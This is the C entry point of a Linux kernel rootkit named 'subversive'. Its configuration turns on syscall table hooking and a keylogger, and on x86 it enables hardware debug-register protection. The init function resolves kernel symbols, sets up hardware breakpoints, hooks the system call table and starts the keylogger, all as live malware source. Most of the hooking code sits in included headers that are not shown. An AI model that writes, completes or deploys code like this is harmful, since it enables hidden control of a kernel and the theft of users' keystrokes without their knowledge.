#include <linux/kernel.h>
#include <linux/module.h>

#include <subversive/arch.h>
#include <subversive/config.h>
#include <subversive/debug.h>
#include <subversive/keylogger.h>
#include <subversive/ksyms.h>
#include <subversive/syscalls.h>
#include <subversive/vfs.h>

MODULE_LICENSE("GPL");

struct subversive_config rk_cfg = {
	.state = RK_BOOT,
#ifdef ARCH_X86
	.dr_protect = 1,
	.patch_debug = 1,
#endif
	.hook_syscall = 1,
	.hook_vfs = 0,
	.keylogger = 1,
};

static int __init subversive_init(void)
{
	int ret;

	pr_debug("%s: init\n", __func__);

	/* MUST be called first */
	ret = get_kernel_syms();
	if (ret)
		return 0;

	/* architecture specific */
	ret = arch_hw_breakpoint_init();
	if (ret)
		return 0;
	arch_hw_breakpoint_debug();

	if (rk_cfg.hook_syscall)
		hook_sys_call_table();
	if (rk_cfg.hook_vfs)
		vfs_hook();
	if (rk_cfg.keylogger)
		keylogger_init();
#if ARCH_X86
	if (rk_cfg.dr_protect)
		x86_hw_breakpoint_protect_enable();
#endif

	rk_cfg.state = RK_ACTIVE;

	return 0;
}

static void __exit subversive_exit(void)
{
	rk_cfg.state = RK_SHUTDOWN;
	if (rk_cfg.keylogger)
		keylogger_exit();
#if ARCH_X86
	if (rk_cfg.dr_protect)
		x86_hw_breakpoint_protect_disable();
#endif

	pr_debug("%s: exit\n", __func__);

	/* architecture specific */
	arch_hw_breakpoint_exit();
}

module_init(subversive_init);
module_exit(subversive_exit);
